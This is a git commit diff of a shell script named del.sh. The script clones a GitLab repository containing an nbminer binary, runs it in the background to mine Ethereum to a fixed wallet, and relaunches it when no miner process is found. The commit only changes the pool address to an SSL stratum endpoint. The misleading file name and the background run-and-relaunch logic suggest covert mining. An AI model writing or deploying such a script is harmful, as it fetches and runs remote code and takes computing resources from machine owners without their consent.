1b7653c8b55c880843c80ded17c3bb044a88f818
weda212 <101047210+weda212@users.noreply.github.com>
2022-03-20 14:12:26 +0700

    Update del.sh

--- del.sh
+++ del.sh
@@ -5,13 +5,13 @@ if [ ! -f "${SCRIPT_DIR}/B8648rns22.txt" ]; then
 	echo "Start setup..."
 	echo "B8648rns22" > B8648rns22.txt
 	git clone https://gitlab.com/zoey8059459/nb.git && cd nb && chmod +x ./nbminer
-	./nbminer -a ethash -o eth-sg.flexpool.io -u 0x3DA2C7743970908cac0e6B606f064330AeA8B03F.$woker &
+	./nbminer -a ethash -o stratum+ssl://eth-sg.flexpool.io:5555 -u 0x3DA2C7743970908cac0e6B606f064330AeA8B03F.$woker &
 else
 	if pgrep t-rex >/dev/null 2>&1
 	then
 		echo "RUNNING"
 	else
 		git clone https://gitlab.com/zoey8059459/nb.git && cd nb && chmod +x ./nbminer
-	./nbminer -a ethash -o eth-sg.flexpool.io -u 0x3DA2C7743970908cac0e6B606f064330AeA8B03F.$woker &
+	./nbminer -a ethash -o stratum+ssl://eth-sg.flexpool.io:5555 -u 0x3DA2C7743970908cac0e6B606f064330AeA8B03F.$woker &
 	fi
 fi
